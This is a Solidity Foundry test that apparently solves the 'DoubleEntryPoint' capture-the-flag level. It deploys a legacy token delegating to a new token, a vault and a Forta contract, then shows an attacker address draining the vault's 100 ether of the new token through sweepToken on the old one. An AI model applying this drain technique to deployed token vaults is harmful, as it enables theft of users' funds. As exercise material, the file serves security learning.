// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { IERC20 } from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import { 
    DoubleEntryPoint,
    LegacyToken,
    CryptoVault,
    Forta,
    DelegateERC20
} from "./DoubleEntryPoint.sol";

contract DoubleEntryPointTest is Test {
    LegacyToken oldToken;
    DoubleEntryPoint newToken;
    Forta forta;
    CryptoVault vault;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        oldToken = new LegacyToken();
        forta = new Forta();
        vault = new CryptoVault(h3x0r);
        newToken = new DoubleEntryPoint(
            address(oldToken),
            address(vault),
            address(forta),
            h3x0r
        );
        vault.setUnderlying(address(newToken));
        oldToken.delegateToNewContract(DelegateERC20(address(newToken)));
        oldToken.mint(address(vault), 100 ether);
    }

    function testDoubleEntryPointHack() public {
        vm.startPrank(h3x0r);
        
        vault.sweepToken(oldToken);

        assertEq(newToken.balanceOf(address(vault)), 0 ether);
        assertEq(newToken.balanceOf(h3x0r), 100 ether);
    }
}